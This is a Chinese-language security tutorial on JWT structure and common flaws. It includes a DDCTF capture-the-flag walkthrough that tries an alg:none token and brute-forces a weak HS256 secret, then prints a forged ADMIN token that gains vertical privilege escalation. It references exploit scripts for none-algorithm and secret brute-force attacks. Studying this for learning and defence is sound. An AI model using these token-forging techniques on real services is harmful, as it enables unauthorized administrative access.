---
title: JWT漏洞原理与实战利用
description: 系统梳理 JWT 结构、常见漏洞（算法混淆、密钥爆破、信息泄露）及利用工具，结合 DDCTF 实战复现垂直越权全过程。
category: ai-security
tags:
- JWT
- 漏洞利用
- DDCTF
- 垂直越权
- 算法混淆
- 密钥爆破
- 信息泄露
date: '2023-04-16'
updated: '2026-11-12'
---

## JWT 结构详解

典型的 JWT 由三个部分组成，每部分之间用 `.` 分隔：**Header**、**Payload**、**Signature**。

### Header

头部包含签名算法与令牌类型，通常为 JSON 格式，经 Base64URL 编码后传输。

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `alg`：签名算法（如 HS256、RS256、none 等）
- `typ`：令牌类型，固定为 `JWT`

### Payload

载荷包含业务数据与标准声明，同样经 Base64URL 编码。标准字段包括：

| 字段 | 含义 |
|------|------|
| `iss` | 签发人 |
| `exp` | 过期时间 |
| `iat` | 签发时间 |
| `nbf` | 生效时间 |
| `jti` | 编号 |
| `sub` | 主题 |
| `aud` | 受众 |

除标准字段外，可自定义私有字段（如 `userRole`、`name` 等）。

### Signature

签名用于防篡改，生成方式：

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

密钥仅服务器持有，泄露将导致伪造风险。

### Base64URL 编码说明

标准 Base64 可能出现 `+`、`/`、`=`，不适合 URL 传参。Base64URL 将 `+`→`-`、`/`→`_`、去掉末尾 `=`。

## JWT 使用方式

- 客户端登录成功后获取 JWT，存储于 Cookie / localStorage。
- 后续请求通过以下方式携带：
  - Cookie（同域自动发送）
  - `Authorization: Bearer <token>` 请求头
  - URL 参数或 POST Body

## JWT 安全注意事项

1. **默认不加密**：Payload 仅编码，不可存放敏感信息。
2. **密钥保密**：签名密钥一旦泄露，攻击者可伪造任意 Token。
3. **无状态不可撤销**：签发后无法主动失效，建议设置较短 `exp` 并配合黑名单机制。
4. **传输加密**：必须使用 HTTPS 防止中间人窃取。

## DDCTF 实战复现：垂直越权漏洞利用

### 题目环境与初步分析

- 目标地址：`http://117.51.136.197/`
- 两个关键接口：
  1. `POST /admin/login`：传 `username`、`pwd`，返回 JWT。
  2. `POST /admin/auth`：传 `username`、`pwd`、`token`，校验权限。

首次登录 `admin` 账号，返回 Token 解码后 `userRole=GUEST`，提示需要 `ADMIN` 权限。

### 步骤一：获取并解码 JWT

登录响应 `data` 字段为典型三段式 JWT：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkdVRVNUIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.xxx
```

解码 Header 与 Payload：

```json
// Header
{"typ":"JWT","alg":"HS256"}

// Payload
{"userRole":"GUEST","name":"admin","iat":1556499536}
```

发现 `userRole` 可控，若能修改为 `ADMIN` 并绕过签名校验，即可实现垂直越权。

### 步骤二：尝试算法混淆攻击

**原理**：若服务端支持 `alg: "none"`，则忽略签名验证，仅需 Header+Payload。

构造脚本（参考 [JwtExploit](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtNone.py)）生成 Token：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.
```

请求 `/admin/auth` 返回 **Token 不合法**，说明服务端禁用了 `none` 算法。

### 步骤三：密钥爆破

HS256 为对称加密，密钥强度取决于复杂度。使用字典爆破脚本（参考 [jwtBrute.py](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtBrute.py)）跑出密钥：**`admin`**（规律：密钥即用户名）。

### 步骤四：构造恶意 JWT 实现越权

利用爆破出的密钥 `admin`，按以下步骤构造合法 Token：

1. **Header Base64URL**  
   `{"typ":"JWT","alg":"HS256"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`

2. **Payload Base64URL**  
   `{"userRole":"ADMIN","name":"admin","iat":1556499536}` → `eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ`

3. **签名计算**  
   对 `header.payload` 使用 HMAC-SHA256，密钥 `admin`：  
   `HMACSHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ", "admin")`  
   → `J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

4. **拼接完整 Token**  
   `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

携带该 Token 请求 `/admin/auth`，成功获取 Flag 页面：`http://117.51.136.197/B5Itb8dFDaSFWZZo/client`。

> 也可使用 [jwt.io Debugger](https://jwt.io/) 可视化完成上述构造。

## 利用工具与脚本

- **JwtExploit** 系列脚本（GitHub）：  
  - `jwtNone.py`：算法混淆生成 `none` 算法 Token  
  - `jwtBrute.py`：HS256 密钥字典爆破
- **CyberChef** / **jwt.io** ：Base64URL 编解码、签名计算、Token 调试
- **Burp Suite** 插件：JWT Editor、JSON Web Tokens 支持自动化测试

## 参考资源

- 原文：[微信公众号文章](http://mp.weixin.qq.com/s?__biz=MzIxNzM3MDgyMw==&mid=2247483809&idx=1&sn=249be28eebc78d7efa7e84cca4f5c865)
- 作者 GitHub：<https://github.com/ShadowFlow123/>
- 博客园对应文章：<https://www.cnblogs.com/jinbuqi/p/10361698.html>

## 来源

- [007攻防实验室-202007-202010_3](../sources/007攻防实验室-202007-202010_3.md)
